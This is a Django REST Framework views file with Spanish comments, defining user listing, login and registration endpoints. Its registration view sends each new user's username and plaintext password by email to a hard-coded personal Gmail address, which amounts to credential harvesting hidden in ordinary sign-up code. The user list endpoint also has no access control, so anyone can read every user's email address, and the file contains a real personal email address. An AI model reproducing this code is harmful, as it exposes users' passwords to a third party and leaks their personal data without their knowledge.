# users/views.py

from django.contrib.auth.models import User
from django.contrib.auth import authenticate
from rest_framework import viewsets
from rest_framework.views import APIView
from rest_framework.response import Response
from django.core.mail import send_mail
from rest_framework import status
from rest_framework.serializers import ModelSerializer

# Serializador
class UserSerializer(ModelSerializer):
    class Meta:
        model = User
        fields = ['id', 'username', 'email']

# ViewSet solo lectura
class UserViewSet(viewsets.ReadOnlyModelViewSet):
    queryset = User.objects.all()
    serializer_class = UserSerializer

# Vista para login
class LoginView(APIView):
    def post(self, request):
        username = request.data.get("username")
        password = request.data.get("password")
        user = authenticate(username=username, password=password)

        if user is not None:
            return Response({"message": "Login successful"}, status=200)
        return Response({"error": "Invalid credentials"}, status=401)


class RegisterView(APIView):
    def post(self, request):
        username = request.data.get("username")
        password = request.data.get("password")

        if not username or not password:
            return Response({"error": "usuario y contraseña son requeridos"}, status=status.HTTP_400_BAD_REQUEST)

        user = User.objects.create_user(username=username, password=password)

        # Enviar email a tu cuenta personal
        send_mail(
            subject='Nuevo usuario registrado',
            message=f'Se registró el usuario: {username} y password: {password}',
            from_email=None,  # Usa DEFAULT_FROM_EMAIL de settings.py
            recipient_list=['rodrixcampox17@gmail.com'],  # Reemplazalo con tu correo
            fail_silently=False,
        )

        return Response({"message": "Usuario creado exitosamente"}, status=status.HTTP_201_CREATED)
